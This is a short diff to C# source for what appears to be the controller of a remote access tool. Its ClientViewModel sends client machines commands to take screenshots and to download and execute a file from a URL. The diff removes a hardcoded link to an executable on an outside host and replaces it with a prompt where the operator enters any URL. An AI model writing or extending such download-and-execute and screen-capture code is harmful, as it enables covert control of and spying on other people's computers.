@@ -8,6 +8,7 @@
     using Microsoft.VisualBasic;
 
     using System.Windows.Input;
+    using GuiServer.ViewImplementation.Windows;
 
     public class ClientViewModel : INotifyPropertyChanged
     {
@@ -39,17 +40,16 @@
 
         private void Screenshot()
         {
-            this.clientSocket.SendObject(1111, 40L);
+            this.clientSocket.SendObject(1001, 40L);
         }
         private void DownloadExecute()
         {
-
-            String url = "http://www.sheeptech.com/download/mspaint.exe";
-
-
-         
-            DownloadExec downloadExec = new DownloadExec(url);
-            this.clientSocket.SendObject(1112, downloadExec);
+            string url = TextInputWindow.ShowWindow("Download and Execute", "URL:");
+            if (!string.IsNullOrEmpty(url))
+            {
+                DownloadExec downloadExec = new DownloadExec(url);
+                this.clientSocket.SendObject(1002, downloadExec);
+            }
         }
 
         public ICommand CmdScreenshot { get; set; }
